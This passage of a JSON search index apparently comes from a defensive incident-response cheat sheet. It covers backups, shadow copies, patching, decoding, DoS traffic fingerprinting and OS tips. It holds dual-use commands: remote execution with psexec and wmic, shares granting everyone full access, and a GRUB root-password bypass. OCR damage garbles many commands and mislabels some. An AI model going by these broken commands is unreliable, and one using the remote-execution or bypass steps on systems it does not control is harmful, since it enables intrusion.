NAME>/home/quarantine/","title":"backup"},{"location":"capturetheflag/basic/recover/backuo/#windows","text":"","title":"WINDOWS"},{"location":"capturetheflag/basic/recover/backuo/#backup-gpo-audit-policy-to-backup-file","text":"C:\\> auditpol /backup /file:C\\auditpolicy.csv","title":"Backup GPO Audit Policy to backup file:"},{"location":"capturetheflag/basic/recover/backuo/#restore-gpo-audit-policy-from-backup-file","text":"C:\\> auditpol /restore /file:C:\\auditpolicy.csv","title":"Restore GPO Audit Policy from backup file:"},{"location":"capturetheflag/basic/recover/backuo/#backup-all-gpos-in-domain-and-save-to-path","text":"PS C:\\> Backup-Gpo -All -Path \\\\<SERVER>\\<PATH TOBACKUPS>","title":"Backup All GPOs in domain and save to Path:"},{"location":"capturetheflag/basic/recover/backuo/#restore-all-gpos-in-domain-and-save-to-path","text":"PS C:\\> Restore-GPO -All -Domain <INSERT DOMAINNAME> -Path \\\\Serverl\\GpoBackups","title":"Restore All GPOs in domain and save to Path:"},{"location":"capturetheflag/basic/recover/backuo/#start-volume-shadow-service","text":"C:\\> net start VSS","title":"Start Volume Shadow Service:"},{"location":"capturetheflag/basic/recover/backuo/#list-all-shadow-files-and-storage","text":"C:\\> vssadmin List ShadowStorage","title":"List all shadow files and storage:"},{"location":"capturetheflag/basic/recover/backuo/#list-all-shadow-files","text":"C:\\> vssadmin List Shadows","title":"List all shadow files:"},{"location":"capturetheflag/basic/recover/backuo/#browse-shadow-copy-for-filesfolders","text":"C:\\> mklink /d c:\\<CREATE FOLDER>\\<PROVIDE FOLDERNAME BUT DO NOT CREATE>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyl\\","title":"Browse Shadow Copy for files/folders:"},{"location":"capturetheflag/basic/recover/backuo/#revert-back-to-a-selected-shadow-file-on-windows-server-and-windows-8","text":"C:\\> vssadmin revert shadow /shadow={<SHADOW COPYID>} /ForceDismount","title":"Revert back to a selected shadow file on Windows Server and Windows 8:"},{"location":"capturetheflag/basic/recover/backuo/#list-a-files-previous-versions-history-using-volrestexe","text":"Ref. https://www.microsoft.com/enus/download/details.aspx?id=17657 C:\\> \"\\Program Files (x86)\\Windows ResourceKits\\Tools\\volrest.exe\" \"\\\\localhost\\c$\\<PATH TOFILE>\\<FILE NAME>\"","title":"List a files previous versions history using volrest.exe:"},{"location":"capturetheflag/basic/recover/backuo/#revert-back-to-a-selected-previous-file-version-or-gmt-file-name-for-specific-previous-version-using-volrestexe","text":"C:\\> subst Z: \\\\localhost\\c$\\$\\<PATH TO FILE> C:\\> \"\\Program Files (x86)\\Windows ResourceKits\\Tools\\volrest.exe\" \"\\\\localhost\\c$\\<PATH TOFILE>\\<CURRENT FILE NAME OR @GMT FILE NAME FROM LISTCOMMAND ABOVE>\" /R:Z:\\ C:\\> subst Z: /0","title":"Revert back to a selected previous file version or @GMT file name for specific previous version using volrest.exe:"},{"location":"capturetheflag/basic/recover/backuo/#revert-back-a-directory-and-subdirectory-filesprevious-version-using-volrestexe","text":"C: \\> \"\\Program Files (x86) \\Windows ResourceKits\\Tools\\volrest.exe\" \\\\localhost\\c$\\<PATH TOFOLDER\\*\u00b7* /5 /r:\\\\localhost\\c$\\<PATH TO FOLDER>\\","title":"Revert back a directory and subdirectory filesprevious version using volrest.exe:"},{"location":"capturetheflag/basic/recover/backuo/#revert-back-to-a-selected-shadow-file-on-windows-server-and-windows-7-and-10-using-wmic","text":"C:\\> wmic shadowcopy call create Volume='C:\\'","title":"Revert back to a selected shadow file on Windows Server and Windows 7 and 10 using wmic:"},{"location":"capturetheflag/basic/recover/backuo/#create-a-shadow-copy-of-volume-c-on-windows-7-and-10-using-powershell","text":"PS C:\\> (gwmi -listwin32_shadowcopy).Create('C:\\', 'ClientAccessible')","title":"Create a shadow copy of volume C on Windows 7 and 10 using PowerShell:"},{"location":"capturetheflag/basic/recover/backuo/#create-a-shadow-copy-of-volume-c-on-windows-server-2003-and-2008","text":"C:\\> vssadmin create shadow /for=c:","title":"Create a shadow copy of volume C on Windows Server 2003 and 2008:"},{"location":"capturetheflag/basic/recover/backuo/#create-restore-point-on-windows","text":"C:\\> wmic.exe /Namespace:\\\\root\\default Path","title":"Create restore point on Windows:"},{"location":"capturetheflag/basic/recover/backuo/#systemrestore-call-createrestorepoint-date-100-start-system-restore-points-on-windows-xp","text":"C:\\> sc config srservice start= disabled C:\\> reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f C:\\> net stop srservice","title":"SystemRestore Call CreateRestorePoint \"%DATE%\", 100, Start system restore points on Windows XP:"},{"location":"capturetheflag/basic/recover/backuo/#stop-system-restore-points-on-windows-xp","text":"C:\\> sc config srservice start= Auto C:\\> net start srservice C:\\> reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 0 /f","title":"Stop system restore points on Windows XP:"},{"location":"capturetheflag/basic/recover/backuo/#list-of-restore-points","text":"PS C:\\> Get-ComputerRestorePoint","title":"List of restore points:"},{"location":"capturetheflag/basic/recover/backuo/#restore-from-a-specific-restore-point","text":"PS C:\\> Restore-Computer -RestorePoint <RESTOREPOINT#> -Confirm","title":"Restore from a specific restore point:"},{"location":"capturetheflag/basic/recover/backuo/#linux","text":"","title":"LINUX"},{"location":"capturetheflag/basic/recover/backuo/#reset-root-password-in-single-user-mode","text":"","title":"Reset root password in single user mode:"},{"location":"capturetheflag/basic/recover/backuo/#step-1-reboot-system","text":"reboot -f","title":"Step 1: Reboot system."},{"location":"capturetheflag/basic/recover/backuo/#step-2-press-esc-at-grub-screen","text":"","title":"Step 2: Press ESC at GRUB screen."},{"location":"capturetheflag/basic/recover/backuo/#step-3-select-default-entry-and-then-e-for-edit","text":"","title":"Step 3: Select default entry and then 'e' for edit."},{"location":"capturetheflag/basic/recover/backuo/#step-4-scroll-down-until-you-see-a-line-that-starts-with-linux-linux16-or-linuxefi","text":"","title":"Step 4: Scroll down until, you see a line that starts with linux, linux16 or linuxefi."},{"location":"capturetheflag/basic/recover/backuo/#step-5-at-end-of-that-line-leave-a-space-and-add-without-quote-rw-initbinbash","text":"","title":"Step 5: At end of that line leave a space and add without quote 'rw init=/bin/bash'"},{"location":"capturetheflag/basic/recover/backuo/#step-6-press-ctrl-x-to-reboot","text":"","title":"Step 6: Press Ctrl-X to reboot."},{"location":"capturetheflag/basic/recover/backuo/#step-7-after-reboot-should-be-in-single-user-modeand-root-change-password","text":"passwd","title":"Step 7: After reboot, should be in single user modeand root, change password."},{"location":"capturetheflag/basic/recover/backuo/#step-8-reboot-system","text":"# reboot -f","title":"Step 8: Reboot system."},{"location":"capturetheflag/basic/recover/backuo/#reinstall-a-package","text":"# apt-get install --reinstall <COMPROMISED PACKAGENAME>","title":"Reinstall a package:"},{"location":"capturetheflag/basic/recover/backuo/#reinstall-all-packages","text":"# apt-get install --reinstall $(dpkg --getselections lgrep -v deinstall)","title":"Reinstall all packages:"},{"location":"capturetheflag/basic/recover/backuo/#kill-malware-process","text":"","title":"KILL MALWARE PROCESS"},{"location":"capturetheflag/basic/recover/backuo/#windows_1","text":"","title":"WINDOWS"},{"location":"capturetheflag/basic/recover/backuo/#malware-removal","text":"Ref. http://www.gmer.net/ C:\\> gmer.exe (GUI)","title":"Malware Removal:"},{"location":"capturetheflag/basic/recover/backuo/#kill-running-malicious-file","text":"C:\\> gmer.exe -killfile C:\\WINDOWS\\system32\\drivers\\<MALICIOUS FILENAME>.exe","title":"Kill running malicious file:"},{"location":"capturetheflag/basic/recover/backuo/#kill-running-malicious-file-in-powershell","text":"PS C:\\> Stop-Process -Name <PROCESS NAME> PS C:\\> Stop-Process -ID <PID>","title":"Kill running malicious file in PowerShell:"},{"location":"capturetheflag/basic/recover/backuo/#linux_1","text":"","title":"LINUX"},{"location":"capturetheflag/basic/recover/backuo/#stop-a-malware-process","text":"kill <MALICIOUS PID>","title":"Stop a malware process:"},{"location":"capturetheflag/basic/recover/backuo/#change-the-malware-process-from-execution-and-move","text":"chmod -x /usr/sbin/<SUSPICIOUS FILE NAME> mkdir /home/quarantine/ mv /usr/sbin/<SUSPICIOUS FILE NAME>/home/quarantine/","title":"Change the malware process from execution and move:"},{"location":"capturetheflag/basic/recover/patching/","text":"WINDOWS Single Hotfix update for Windows 7 or higher: C:\\> wusa.exe C:\\<PATH TO HOTFIX>\\Windows6.0-KB934307-x86.msu Set of single hotfix updates for pre Windows 7 by running a batch script: @echo off setlocal set PATHTOFIXES=E:\\hotfix %PATHTOFIXES%\\Q123456_w2k_sp4_x86.exe /2 /M %PATHTOFIXES%\\Ql23321_w2k_sp4_x86.exe /2 /M %PATHTOFIXES%\\Q123789_w2k_sp4_x86.exe /2 /M To check and update Windows 7 or higher: C:\\> wuauclt.exe /detectnow /updatenow LINUX Ubuntu: Fetch list of available updates: apt-get update Strictly upgrade the current packages: apt-get upgrade Install updates (new ones): apt-get dist-upgrade Red Hat Enterprise Linux 2.1,3,4: up2date To update non-interactively: up2date-nox --update To install a specific package: up2date <PACKAGE NAME> To update a specific package: up2date -u <PACKAGE NAME> Red Hat Enterprise Linux 5: pup Red Hat Enterprise Linux 6: yum update To list a specific installed package: yum list installed <PACKAGE NAME> To install a specific package: yum install <PACKAGE NAME> To update a specific package: yum update <PACKAGE NAME> Kali: apt-get update && apt-get upgrade","title":"patching"},{"location":"capturetheflag/basic/recover/patching/#windows","text":"","title":"WINDOWS"},{"location":"capturetheflag/basic/recover/patching/#single-hotfix-update-for-windows-7-or-higher","text":"C:\\> wusa.exe C:\\<PATH TO HOTFIX>\\Windows6.0-KB934307-x86.msu","title":"Single Hotfix update for Windows 7 or higher:"},{"location":"capturetheflag/basic/recover/patching/#set-of-single-hotfix-updates-for-pre-windows-7-by-running-a-batch-script","text":"@echo off setlocal set PATHTOFIXES=E:\\hotfix %PATHTOFIXES%\\Q123456_w2k_sp4_x86.exe /2 /M %PATHTOFIXES%\\Ql23321_w2k_sp4_x86.exe /2 /M %PATHTOFIXES%\\Q123789_w2k_sp4_x86.exe /2 /M","title":"Set of single hotfix updates for pre Windows 7 by running a batch script:"},{"location":"capturetheflag/basic/recover/patching/#to-check-and-update-windows-7-or-higher","text":"C:\\> wuauclt.exe /detectnow /updatenow","title":"To check and update Windows 7 or higher:"},{"location":"capturetheflag/basic/recover/patching/#linux","text":"","title":"LINUX"},{"location":"capturetheflag/basic/recover/patching/#ubuntu-fetch-list-of-available-updates","text":"apt-get update","title":"Ubuntu: Fetch list of available updates:"},{"location":"capturetheflag/basic/recover/patching/#strictly-upgrade-the-current-packages","text":"apt-get upgrade","title":"Strictly upgrade the current packages:"},{"location":"capturetheflag/basic/recover/patching/#install-updates-new-ones","text":"apt-get dist-upgrade","title":"Install updates (new ones):"},{"location":"capturetheflag/basic/recover/patching/#red-hat-enterprise-linux-2134","text":"up2date","title":"Red Hat Enterprise Linux 2.1,3,4:"},{"location":"capturetheflag/basic/recover/patching/#to-update-non-interactively","text":"up2date-nox --update","title":"To update non-interactively:"},{"location":"capturetheflag/basic/recover/patching/#to-install-a-specific-package","text":"up2date <PACKAGE NAME>","title":"To install a specific package:"},{"location":"capturetheflag/basic/recover/patching/#to-update-a-specific-package","text":"up2date -u <PACKAGE NAME>","title":"To update a specific package:"},{"location":"capturetheflag/basic/recover/patching/#red-hat-enterprise-linux-5","text":"pup","title":"Red Hat Enterprise Linux 5:"},{"location":"capturetheflag/basic/recover/patching/#red-hat-enterprise-linux-6","text":"yum update","title":"Red Hat Enterprise Linux 6:"},{"location":"capturetheflag/basic/recover/patching/#to-list-a-specific-installed-package","text":"yum list installed <PACKAGE NAME>","title":"To list a specific installed package:"},{"location":"capturetheflag/basic/recover/patching/#to-install-a-specific-package_1","text":"yum install <PACKAGE NAME>","title":"To install a specific package:"},{"location":"capturetheflag/basic/recover/patching/#to-update-a-specific-package_1","text":"yum update <PACKAGE NAME>","title":"To update a specific package:"},{"location":"capturetheflag/basic/recover/patching/#kali","text":"apt-get update && apt-get upgrade","title":"Kali:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/","text":"HEX CONVERSION Convert from hex to decimal in Windows: C:\\> set /a 0xff PS C:\\> 0xff Other Basic Math in Windows: C:\\> set /a 1+2 C:\\> set /a 3*(9/4) C:\\> set /a (2*5)/2 C:\\> set /a \"32>>3\" Decode Base64 text in a file: C:\\> certutil -decode <BASE64<DECODED FILE NAME> ENCODED Decode XOR and search for http: Ref,https://blog.didierstevens.com/programs/xorsearch/ C:\\> xorsearch,exe -i -s <INPUT FILE NAME> http Convert from hex to decimal in Linux: echo u0xff\"lwcalc -d = 255 Convert from decimal to hex in Linux: $ echo u25s\"1wcalc -h = 0xff Decode HTML Strings: PS C:\\> Add-Type -AssemblyName System.Web PS C:\\>[System.Uri] ::UnescapeDataString(\"HTTP%3a%2f%2fHello%20World.com\") HTTP://Hello World.com","title":"decoding"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#hex-conversion","text":"","title":"HEX CONVERSION"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#convert-from-hex-to-decimal-in-windows","text":"C:\\> set /a 0xff PS C:\\> 0xff","title":"Convert from hex to decimal in Windows:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#other-basic-math-in-windows","text":"C:\\> set /a 1+2 C:\\> set /a 3*(9/4) C:\\> set /a (2*5)/2 C:\\> set /a \"32>>3\"","title":"Other Basic Math in Windows:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#decode-base64-text-in-a-file","text":"C:\\> certutil -decode <BASE64<DECODED FILE NAME>","title":"Decode Base64 text in a file:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#encoded","text":"","title":"ENCODED"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#decode-xor-and-search-for-http","text":"Ref,https://blog.didierstevens.com/programs/xorsearch/ C:\\> xorsearch,exe -i -s <INPUT FILE NAME> http","title":"Decode XOR and search for http:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#convert-from-hex-to-decimal-in-linux","text":"echo u0xff\"lwcalc -d = 255","title":"Convert from hex to decimal in Linux:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#convert-from-decimal-to-hex-in-linux","text":"$ echo u25s\"1wcalc -h = 0xff","title":"Convert from decimal to hex in Linux:"},{"location":"capturetheflag/basic/tips_end_tricks/decoding/#decode-html-strings","text":"PS C:\\> Add-Type -AssemblyName System.Web PS C:\\>[System.Uri] ::UnescapeDataString(\"HTTP%3a%2f%2fHello%20World.com\") HTTP://Hello World.com","title":"Decode HTML Strings:"},{"location":"capturetheflag/basic/tips_end_tricks/dos/","text":"FINGERPRINT DOS/DDOS Fingerprinting the type of DoS/DDoS: Ref. https://www.trustwave.com/Resources/SpiderLabsBlog/PCAP-Files-Are-Great-Arn-t-They--/ Volumetric: Bandwidth consumption Example, sustaining sending 1Gb of traffic to 10Mb connection Ref. http://freecode.com/projects/iftop # iftop -n and Protocol: Use of specific protocol Example, SYN Flood, ICMP Flood, UDP flood # tshark -r <FILE NAME>,pcap -q -z io,phs # tshark -c 1000 -q -z io,phs # tcpdump -tn r $FILE I awk -F '. ' '{print $1\",\"$2\".\"$3\",\"$4}' I sort I uniq -c I sort -n I tail # tcpdump -qnn \"tcp[tcpflags] & (tcp-syn) != 0\" # netstat -s Example, isolate one protocol and or remove other protocols # tcpdump -nn not arp and not icmp and not udp # tcpdump -nn tcp Resource: State and connection exhaustion Example, Firewall can handle 10,000 simultaneous connections, and attacker sends 20,000 # netstat -n I awk '{print $6}' I sort I uniq -c sort -nr I head Application: Layer 7 attacks Example, HTTP GET flood, for a large image file. # tshark -c 10000 -T fields -e http.host| uniq -c | sort -r | head -n 10 so rt | # tshark -r capture6 -T fields -e http.request.full\\_uri I sort I uniq -c I sort -r I head -n 10c # tcpdump -n 'tcp[32:4] = 0x47455420' I cut -f 7- -d II\u2022 II Example, look for excessive file requests, GIF, ZIP,JPEG, PDF, PNG. # tshark -Y \"http contains 11ff :d811 11 11 \"http contains 11GIF89a11 \" I I \"http contains 11\\x50\\x4B\\x03\\x0411 11 11 \"http contains\\xff\\xd8 11 11 11 \"http contains 11%PDF11 11 I I \"http contains \"\\x89\\x50\\x4E\\x47\"\" Example, Look for web application 'user-agent' pattern of abuse. # tcpdump -c 1000 -Ann I grep -Ei 'user-agent' sort I uniq -c I sort -nr I head -10 Example, show HTTP Header of requested resources. # tcpdump -i en0 -A -s 500 I grep -i refer Sniff HTTP Headers for signs of repeat abuse: # tcpdump -s 1024 -l -A dst <EXAMPLE.COM> Poison: Layer 2 attacks Example, ARP poison, race condition DNS, DHCP # tcpdump 'arp or icmp' # tcpdump -tnr <SAMPLE TRAFFIC FILE>.pcap ARP lawk -F ',' '{print $1\".\"$2\",\"$3\",\"$4}' I sort I uniq -c sort -n I tail # tshark -r <SAMPLE TRAFFIC FILE>.pcap -q -z io,phsl grep arp.duplicate-address-detected","title":"dos"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#fingerprint-dosddos","text":"","title":"FINGERPRINT DOS/DDOS"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#fingerprinting-the-type-of-dosddos","text":"Ref. https://www.trustwave.com/Resources/SpiderLabsBlog/PCAP-Files-Are-Great-Arn-t-They--/","title":"Fingerprinting the type of DoS/DDoS:"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#volumetric-bandwidth-consumption-example-sustaining-sending-1gb-of-traffic-to-10mb-connection","text":"Ref. http://freecode.com/projects/iftop # iftop -n","title":"Volumetric: Bandwidth consumption Example, sustaining sending 1Gb of traffic to 10Mb connection"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#and-protocol-use-of-specific-protocol-example-syn-flood-icmp-flood-udp-flood","text":"# tshark -r <FILE NAME>,pcap -q -z io,phs # tshark -c 1000 -q -z io,phs # tcpdump -tn r $FILE I awk -F '. ' '{print $1\",\"$2\".\"$3\",\"$4}' I sort I uniq -c I sort -n I tail # tcpdump -qnn \"tcp[tcpflags] & (tcp-syn) != 0\" # netstat -s","title":"and Protocol: Use of specific protocol Example, SYN Flood, ICMP Flood, UDP flood"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#example-isolate-one-protocol-and-or-remove-other-protocols","text":"# tcpdump -nn not arp and not icmp and not udp # tcpdump -nn tcp","title":"Example, isolate one protocol and or remove other protocols"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#resource-state-and-connection-exhaustion-example-firewall-can-handle-10000-simultaneous-connections-and-attacker-sends-20000","text":"# netstat -n I awk '{print $6}' I sort I uniq -c sort -nr I head","title":"Resource: State and connection exhaustion Example, Firewall can handle 10,000 simultaneous connections, and attacker sends 20,000"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#application-layer-7-attacks-example-http-get-flood-for-a-large-image-file","text":"# tshark -c 10000 -T fields -e http.host| uniq -c | sort -r | head -n 10 so rt | # tshark -r capture6 -T fields -e http.request.full\\_uri I sort I uniq -c I sort -r I head -n 10c # tcpdump -n 'tcp[32:4] = 0x47455420' I cut -f 7- -d II\u2022 II","title":"Application: Layer 7 attacks Example, HTTP GET flood, for a large image file."},{"location":"capturetheflag/basic/tips_end_tricks/dos/#example-look-for-excessive-file-requests-gif-zipjpeg-pdf-png","text":"# tshark -Y \"http contains 11ff :d811 11 11 \"http contains 11GIF89a11 \" I I \"http contains 11\\x50\\x4B\\x03\\x0411 11 11 \"http contains\\xff\\xd8 11 11 11 \"http contains 11%PDF11 11 I I \"http contains \"\\x89\\x50\\x4E\\x47\"\"","title":"Example, look for excessive file requests, GIF, ZIP,JPEG, PDF, PNG."},{"location":"capturetheflag/basic/tips_end_tricks/dos/#example-look-for-web-application-user-agent-pattern-of-abuse","text":"# tcpdump -c 1000 -Ann I grep -Ei 'user-agent' sort I uniq -c I sort -nr I head -10","title":"Example, Look for web application 'user-agent' pattern of abuse."},{"location":"capturetheflag/basic/tips_end_tricks/dos/#example-show-http-header-of-requested-resources","text":"# tcpdump -i en0 -A -s 500 I grep -i refer","title":"Example, show HTTP Header of requested resources."},{"location":"capturetheflag/basic/tips_end_tricks/dos/#sniff-http-headers-for-signs-of-repeat-abuse","text":"# tcpdump -s 1024 -l -A dst <EXAMPLE.COM>","title":"Sniff HTTP Headers for signs of repeat abuse:"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#poison-layer-2-attacks","text":"","title":"Poison: Layer 2 attacks"},{"location":"capturetheflag/basic/tips_end_tricks/dos/#example-arp-poison-race-condition-dns-dhcp","text":"# tcpdump 'arp or icmp' # tcpdump -tnr <SAMPLE TRAFFIC FILE>.pcap ARP lawk -F ',' '{print $1\".\"$2\",\"$3\",\"$4}' I sort I uniq -c sort -n I tail # tshark -r <SAMPLE TRAFFIC FILE>.pcap -q -z io,phsl grep arp.duplicate-address-detected","title":"Example, ARP poison, race condition DNS, DHCP"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/","text":"WINDOWS Pipe output to clipboard: C:> some_command.exe I clip Output clip to file: (Requires PowerShell 5) PS C:> Get-Clipboard> clip.txt Add time stamps into log file: C:> echo %DATE% %TIME%>> ,txt Add/Modify registry value remotely: C:> reg add \\ \\HKLM\\Software\\ Get registry value remotely: C:> reg query \\ \\HKLM\\Software\\ Test to see if Registry Path exists: PS C:> Test-Path \"HKCU:\\Software\\Microsoft\\ \" Copy files remotely: C:> robocopy C:\\ \\ \\ /E Check to see if certain file extensions are in adirectory: PS C:> Test-Path C:\\Scripts\\Archive* -include *\u00b7PSl, *,VbS Show contents of a file: C:> type Combine contents of multiple files: C:> type > Desktops, allows multiple Desktop Screens: Ref. https://technet.microsoft.com/enus/sysinternals/cc817881 Run live option: C:> \"%ProgramFiles%\\Internet Explorer\\iexplore.exe \" https://live.sysinternals.com/desktops.exe Remote mounting, Read and Read/Write: C:> net share MyShare_R=c:\\ /GRANT:EVERYONE,READ C:> net share MyShare_RW=c:\\ /GRANT:EVERYONE,FULL Remote task execution using PSEXEC: Ref. https://technet.microsoft.com/enus/sysinternals/psexec.aspx C:> psexec.exe \\ -u -p /C C:\\ .exe C:> psexec @(:\\ .txt -u -p C:\\ ,exe >> C:\\ ,txt C:> psexec.exe @(:\\ .csv -u \\ -p /c C:\\ .exe Remote task execution and send output to share: C:> wmic /node:ComputerName process call createucmd,exe /c netstat -an > \\ \\ ,txtn Compare two files for changes: PS C:> Compare-Object (Get-Content , , log) -DifferenceObject (Get-Content . ,log) Remote task execution using PowerShell: PS C:> Invoke-Command - { } PowerShell Command Help: PS C:> Get-Help -full LINUX Analyze traffic remotely over ssh: # ssh root@<REMOTE IP ADDRESS OF HOST TO SNIFF>tcpdump -i any -U -s 0 -w - 'not port 22' Manually add note/data to syslog: logger usomething important to note in Log\" dmesg I grep Simple read only mounting: mount -o ro /dev/ /mnt Mounting remotely over SSH: apt-get install sshfs adduser fuse Log out and log back in. mkdir / sshfs @ :/ / Creating SMB share in Linux: useradd -m passwd smbpasswd -a echo [Share] >> /etc/samba/smb.conf echo / >>/etc/samba/smb.conf echo available = yes >> /etc/samba/smb.conf echo valid users = >>/etc/samba/smb.conf echo read only = no >> /etc/samba/smb.conf echo browsable = yes >> /etc/samba/smb.conf echo public = yes >> /etc/samba/smb.conf echo writable = yes >> /etc/samba/smb.conf service smbd restart Visit share from remote system: smb:\\ Copy files to remote system: scp @ :/ Mount and SMB share to remote system: mount -t smbfs -o username= // / /mnt/ / Monitor a website or file is still up/there: while :; do curl -sSr http:// I head -n 1; sleep 60; done","title":"os_cheats"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#windows","text":"","title":"WINDOWS"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#pipe-output-to-clipboard","text":"C:> some_command.exe","title":"Pipe output to clipboard:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#i-clip-output-clip-to-file-requires-powershell-5","text":"PS C:> Get-Clipboard> clip.txt","title":"I clip Output clip to file: (Requires PowerShell 5)"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#add-time-stamps-into-log-file","text":"C:> echo %DATE% %TIME%>> ,txt","title":"Add time stamps into log file:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#addmodify-registry-value-remotely","text":"C:> reg add \\ \\HKLM\\Software\\ Get registry value remotely: C:> reg query \\ \\HKLM\\Software\\","title":"Add/Modify registry value remotely:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#test-to-see-if-registry-path-exists","text":"PS C:> Test-Path \"HKCU:\\Software\\Microsoft\\ \"","title":"Test to see if Registry Path exists:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#copy-files-remotely","text":"C:> robocopy C:\\ \\ \\ /E","title":"Copy files remotely:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#check-to-see-if-certain-file-extensions-are-in-adirectory","text":"PS C:> Test-Path C:\\Scripts\\Archive* -include *\u00b7PSl, *,VbS","title":"Check to see if certain file extensions are in adirectory:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#show-contents-of-a-file","text":"C:> type","title":"Show contents of a file:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#combine-contents-of-multiple-files","text":"C:> type >","title":"Combine contents of multiple files:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#desktops-allows-multiple-desktop-screens","text":"Ref. https://technet.microsoft.com/enus/sysinternals/cc817881","title":"Desktops, allows multiple Desktop Screens:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#run-live-option","text":"C:> \"%ProgramFiles%\\Internet Explorer\\iexplore.exe \" https://live.sysinternals.com/desktops.exe","title":"Run live option:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#remote-mounting-read-and-readwrite","text":"C:> net share MyShare_R=c:\\ /GRANT:EVERYONE,READ C:> net share MyShare_RW=c:\\ /GRANT:EVERYONE,FULL","title":"Remote mounting, Read and Read/Write:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#remote-task-execution-using-psexec","text":"Ref. https://technet.microsoft.com/enus/sysinternals/psexec.aspx C:> psexec.exe \\ -u -p /C C:\\ .exe C:> psexec @(:\\ .txt -u -p C:\\ ,exe >> C:\\ ,txt C:> psexec.exe @(:\\ .csv -u \\ -p /c C:\\ .exe","title":"Remote task execution using PSEXEC:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#remote-task-execution-and-send-output-to-share","text":"C:> wmic /node:ComputerName process call createucmd,exe /c netstat -an > \\ \\ ,txtn","title":"Remote task execution and send output to share:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#compare-two-files-for-changes","text":"PS C:> Compare-Object (Get-Content , , log) -DifferenceObject (Get-Content . ,log)","title":"Compare two files for changes:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#remote-task-execution-using-powershell","text":"PS C:> Invoke-Command - { }","title":"Remote task execution using PowerShell:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#powershell-command-help","text":"PS C:> Get-Help -full","title":"PowerShell Command Help:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#linux","text":"","title":"LINUX"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#analyze-traffic-remotely-over-ssh","text":"# ssh root@<REMOTE IP ADDRESS OF HOST TO SNIFF>tcpdump -i any -U -s 0 -w - 'not port 22'","title":"Analyze traffic remotely over ssh:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#manually-add-notedata-to-syslog","text":"","title":"Manually add note/data to syslog:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#logger-usomething-important-to-note-in-log","text":"","title":"logger usomething important to note in Log\""},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#dmesg-i-grep","text":"","title":"dmesg I grep "},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#simple-read-only-mounting","text":"","title":"Simple read only mounting:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#mount-o-ro-dev-mnt","text":"","title":"mount -o ro /dev/ /mnt"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#mounting-remotely-over-ssh","text":"","title":"Mounting remotely over SSH:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#apt-get-install-sshfs","text":"","title":"apt-get install sshfs"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#adduser-fuse","text":"","title":"adduser  fuse"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#log-out-and-log-back-in","text":"mkdir /","title":"Log out and log back in."},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#sshfs","text":"","title":"sshfs @://"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#creating-smb-share-in-linux","text":"","title":"Creating SMB share in Linux:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#useradd-m","text":"","title":"useradd -m "},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#passwd","text":"","title":"passwd "},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#smbpasswd-a","text":"","title":"smbpasswd -a "},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-share-etcsambasmbconf","text":"","title":"echo [Share] &gt;&gt; /etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-etcsambasmbconf","text":"","title":"echo / &gt;&gt;/etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-available-yes-etcsambasmbconf","text":"","title":"echo available = yes &gt;&gt; 